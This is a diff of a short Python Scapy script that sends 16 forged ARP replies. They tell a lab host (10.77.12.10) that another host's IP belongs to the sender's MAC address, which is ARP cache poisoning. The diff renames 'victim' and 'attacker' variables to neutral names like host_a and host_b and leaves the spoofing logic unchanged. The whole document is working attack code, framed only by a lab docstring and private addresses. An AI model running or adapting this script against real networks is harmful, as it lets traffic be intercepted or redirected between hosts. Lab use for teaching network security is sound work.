@@ -1,16 +1,16 @@
-"""Bounded forged ARP reply, addressed only to this disposable lab victim."""
+"""Send 16 forged ARP replies to host_a inside the disposable lab."""
 from scapy.all import ARP, Ether, get_if_hwaddr, getmacbyip, sendp
 
-victim_ip = "10.77.12.10"
-service_ip = "10.77.12.20"
+host_a_ip = "10.77.12.10"
+server_1_ip = "10.77.12.20"
 iface = "eth0"
-victim_mac = getmacbyip(victim_ip)
-if not victim_mac:
-    raise SystemExit("Victim MAC unavailable; start the lab and retry")
-attacker_mac = get_if_hwaddr(iface)
-packet = Ether(src=attacker_mac, dst=victim_mac) / ARP(
-    op=2, psrc=service_ip, pdst=victim_ip,
-    hwsrc=attacker_mac, hwdst=victim_mac,
+host_a_mac = getmacbyip(host_a_ip)
+if not host_a_mac:
+    raise SystemExit("host_a MAC unavailable; start the lab and establish the mapping")
+host_b_mac = get_if_hwaddr(iface)
+packet = Ether(src=host_b_mac, dst=host_a_mac) / ARP(
+    op=2, psrc=server_1_ip, pdst=host_a_ip,
+    hwsrc=host_b_mac, hwdst=host_a_mac,
 )
 sendp(packet, iface=iface, count=16, inter=0.25, verbose=False)
-print(f"Sent 16 bounded forged replies: {service_ip} is-at {attacker_mac} to {victim_ip}")
+print(f"Sent 16 forged ARP replies: {server_1_ip} is-at {host_b_mac} to {host_a_ip}")
